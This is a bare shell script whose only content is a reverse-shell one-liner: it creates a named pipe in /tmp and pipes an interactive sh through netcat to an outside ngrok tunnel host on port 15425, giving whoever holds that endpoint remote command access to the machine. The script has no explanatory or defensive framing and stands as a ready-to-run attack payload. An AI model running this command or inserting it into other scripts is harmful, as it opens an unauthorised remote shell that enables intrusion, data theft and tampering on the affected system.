#!/bin/sh

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 4.tcp.ngrok.io 15425 >/tmp/f;
